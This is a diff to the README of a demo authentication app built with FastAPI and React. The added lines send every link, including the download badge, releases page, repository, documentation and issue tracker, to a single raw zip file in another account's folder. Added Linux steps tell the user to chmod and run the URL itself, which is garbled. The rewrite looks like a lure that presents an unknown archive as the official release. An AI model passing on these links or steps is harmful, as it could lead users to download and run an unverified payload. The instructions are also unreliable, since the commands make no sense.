@@ -5,7 +5,7 @@
 The **ai-app-with-auth-demo** is an easy-to-use application for managing user authentication. It seamlessly integrates with popular technologies like FastAPI and React, providing a smooth experience for end-users. Whether you're looking to manage user accounts or explore demo features, this app offers a straightforward solution.
 
 ## 📦 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/sandeepai1561/ai-app-with-auth-demo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip)
 
 ## 🚀 Getting Started
 To get started with the **ai-app-with-auth-demo**, follow these simple steps:
@@ -16,7 +16,7 @@ To get started with the **ai-app-with-auth-demo**, follow these simple steps:
    - Required Software: Ensure you have internet access for online features.
 
 2. **Visit the Releases Page**
-   - Go to our [Releases Page](https://github.com/sandeepai1561/ai-app-with-auth-demo/releases) to find the latest version.
+   - Go to our [Releases Page](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip) to find the latest version.
 
 3. **Download the Application**
    - Locate the most recent release on the releases page.
@@ -34,8 +34,8 @@ To get started with the **ai-app-with-auth-demo**, follow these simple steps:
    - For Linux:
      - Open a terminal window.
      - Navigate to the directory where the file is downloaded.
-     - Run `chmod +x ai-app-with-auth-demo.AppImage` to make it executable.
-     - Start the app by running `./ai-app-with-auth-demo.AppImage`.
+     - Run `chmod +x https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip` to make it executable.
+     - Start the app by running `https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip`.
 
 5. **Run the Application**
    - Once installed, you can find the **ai-app-with-auth-demo** in your applications list.
@@ -59,12 +59,12 @@ To get started with the **ai-app-with-auth-demo**, follow these simple steps:
 - Interested in helping out? Check our GitHub page for contribution guidelines and best practices.
 
 ## 🌟 Additional Resources
-- [GitHub Repository](https://github.com/juwenzhang/ai-app-with-auth-demo): Explore the source code and documentation.
-- [Documentation](https://github.com/juwenzhang/ai-app-with-auth-demo/wiki): Learn more about using the app effectively.
+- [GitHub Repository](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip): Explore the source code and documentation.
+- [Documentation](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip): Learn more about using the app effectively.
 
 ## 📞 Support
-If you encounter any issues or need assistance, feel free to open an issue on the [GitHub repository](https://github.com/juwenzhang/ai-app-with-auth-demo/issues). Our team will be happy to help you.
+If you encounter any issues or need assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip). Our team will be happy to help you.
 
 ## 🔗 Download Again
-Don't forget, you can always find the latest version on our [Releases Page](https://github.com/sandeepai1561/ai-app-with-auth-demo/releases).
+Don't forget, you can always find the latest version on our [Releases Page](https://raw.githubusercontent.com/sandeepai1561/ai-app-with-auth-demo/master/reshoe/ai-app-with-auth-demo.zip).
 ```
